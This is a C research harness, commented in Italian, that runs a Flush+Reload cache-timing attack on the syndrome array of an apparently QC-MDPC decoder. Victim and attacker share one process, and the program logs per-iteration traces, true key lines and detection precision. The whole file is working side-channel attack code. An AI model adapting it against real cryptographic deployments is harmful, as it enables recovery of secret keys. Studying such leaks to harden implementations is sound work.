/* attack.c - Flush+Reload oracle (stesso processo, sincrono) su syndrome_bits[P].
 *
 * Attacco F+R: richiede memoria condivisa vittima<->attaccante (qui banale,
 * stesso processo). Monitora per-linea l'array della sindrome; gli accessi
 * a 'upc' (range diverso) non lo inquinano.
 *
 * Output PARAMETRICO, per-blocco:
 *   <TRUTH_DIR>/H0 , <TRUTH_DIR>/H1   chiave vera per blocco (linee, ordinate asc)
 *   <TRACE_DIR>/H0 , <TRACE_DIR>/H1   traccia osservata, una riga per iterazione
 *                                     (solo le iterazioni che flippano quel blocco)
 *   <TRACE_DIR>/meta                  "P V N0 line gran"  (per solve)
 *
 * Env: TRUTH_DIR (truth) TRACE_DIR (trace) THRESH (130) GRAN (set|bit) LINE (64)
 * Le directory devono esistere (le crea run_fr.sh).
 * argv[1] = seed (default 1)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <immintrin.h>
#include "harness.h"
#include "gf2x.h"
#include "upc.h"
#include "repr.h"

static inline uint64_t rdtsc(void){
   unsigned a,d; asm volatile("lfence\n\trdtsc\n\tlfence":"=a"(a),"=d"(d));
   return ((uint64_t)d<<32)|a;
}
static inline void cflush(volatile void*p){ asm volatile("clflush (%0)"::"r"(p):"memory"); }
static inline uint64_t reload(volatile void*p){
   uint64_t t0,t1; asm volatile("mfence");
   t0=rdtsc(); asm volatile("movq (%0), %%rax"::"r"(p):"rax"); t1=rdtsc();
   return t1-t0;
}
static int cmp_u32(const void*a,const void*b){
   uint32_t x=*(const uint32_t*)a, y=*(const uint32_t*)b; return (x>y)-(x<y);
}

int main(int argc, char **argv)
{
   unsigned seed = argc > 1 ? (unsigned)atoi(argv[1]) : 1;
   srand(seed);

   const char *truth_dir = getenv("TRUTH_DIR") ? getenv("TRUTH_DIR") : "truth";
   const char *trace_dir = getenv("TRACE_DIR") ? getenv("TRACE_DIR") : "trace";
   int set_gran = getenv("GRAN") && strcmp(getenv("GRAN"), "set") == 0;
   uint32_t line_bytes = 1, shift = 0;
   if (set_gran) {
      const char *g = getenv("LINE");
      line_bytes = g ? (uint32_t)atoi(g) : 64;
      uint32_t b = line_bytes; while (b > 1) { b >>= 1; shift++; }
   }
   uint32_t dom = (P + line_bytes - 1) / line_bytes;
   uint64_t thresh = getenv("THRESH") ? strtoull(getenv("THRESH"),0,10) : 130;

   /* --- setup --- */
   static bfkey_t key; static instance_t in;
   key_generate(&key); instance_random(&in, &key);
   static ALIGNED uint8_t upc[PAD8(N0 * P)];
   static uint8_t syn[P];
   memset(upc, 0, sizeof upc);
   dense_to_u8(syn, in.s_dense, P);
   compute_upcs(upc, key.Htr_sparse, syn);
   __m256i v_H_sparse[N0][N_REGS_H];
   const __m256i lane_idx = _mm256_setr_epi32(0,1,2,3,4,5,6,7);
   for (int b=0;b<N0;b++) for (int r=0;r<N_REGS_H;r++){
      int rem = V - r*I32_IN_YMM;
      __m256i km = _mm256_cmpgt_epi32(_mm256_set1_epi32(rem), lane_idx);
      v_H_sparse[b][r] = _mm256_maskload_epi32((const int*)&key.H_sparse[b][r*I32_IN_YMM], km);
   }
   int hw = population_count(in.s_dense);
   static DIGIT e_out[N0 * NUM_DIGITS_GF2X_ELEMENT];
   memset(e_out, 0, sizeof e_out);

   /* file per-blocco della traccia */
   char path[600];
   FILE *tf[N0];
   for (int b=0;b<N0;b++){
      snprintf(path,sizeof path,"%s/H%d",trace_dir,b);
      tf[b]=fopen(path,"w");
      if(!tf[b]){ fprintf(stderr,"non apro %s\n",path); return 1; }
   }

   uint8_t *seen   = calloc(dom, 1);
   uint8_t *probed = calloc(dom, 1);
   long tp=0, fp=0, fn=0;

   int iter = 0;
   while (iter < MAX_ITER && hw != 0) {
      POS col = argmax_u8_ct(upc);
      uint32_t b = col / P, pos = col % P;

      for (int k=0;k<V;k++){
         uint32_t row = key.Htr_sparse[b][k] + pos; row -= (row>=P)?P:0;
         seen[row >> shift] = 1;
      }
      for (uint32_t s=0; s<dom; s++) cflush(&syn[(size_t)s << shift]);
      asm volatile("mfence");
      hw = update_syndrome_and_upcs(upc, key.Htr_sparse, v_H_sparse, col, syn, hw);
      for (uint32_t s=0; s<dom; s++)
         if (reload(&syn[(size_t)s << shift]) < thresh) probed[s] = 1;

      /* scrivi la riga di traccia nel file del blocco b (ordinata asc) */
      int first = 1;
      for (uint32_t s=0; s<dom; s++){
         if (probed[s]) { fprintf(tf[b], first?"%u":" %u", s); first=0; }
         if (probed[s] &&  seen[s]) tp++;
         if (probed[s] && !seen[s]) fp++;
         if (!probed[s] && seen[s]) fn++;
         seen[s]=0; probed[s]=0;
      }
      fprintf(tf[b], "\n");

      gf2x_toggle_coeff(e_out + b*NUM_DIGITS_GF2X_ELEMENT, pos);
      iter++;
   }
   for (int b=0;b<N0;b++) fclose(tf[b]);
   free(seen); free(probed);

   /* truth per-blocco: linee uniche della chiave, ordinate ascendenti */
   for (int b=0;b<N0;b++){
      uint32_t *lines = malloc(V*sizeof(uint32_t));
      int n=0;
      for (int k=0;k<V;k++) lines[n++] = key.Htr_sparse[b][k] >> shift;
      qsort(lines,n,sizeof(uint32_t),cmp_u32);
      snprintf(path,sizeof path,"%s/H%d",truth_dir,b);
      FILE *f=fopen(path,"w");
      uint32_t prev=(uint32_t)-1;
      for (int i=0;i<n;i++) if (lines[i]!=prev){ fprintf(f,"%u\n",lines[i]); prev=lines[i]; }
      fclose(f); free(lines);
   }
   /* meta per solve */
   snprintf(path,sizeof path,"%s/meta",trace_dir);
   FILE *mf=fopen(path,"w");
   fprintf(mf,"%d %d %d %u %s\n", P, V, N0, line_bytes, set_gran?"set":"bit");
   fclose(mf);

   double prec = tp+fp? 100.0*tp/(tp+fp):0, rec = tp+fn? 100.0*tp/(tp+fn):0;
   fprintf(stderr,
      "F+R seed=%u gran=%s thresh=%lu iter=%d decode=%s\n"
      "detection: TP=%ld FP=%ld FN=%ld  precision=%.3f%% recall=%.3f%%\n",
      seed, set_gran?"set":"bit", thresh, iter, hw==0?"ok":"KO", tp,fp,fn,prec,rec);
   return 0;
}
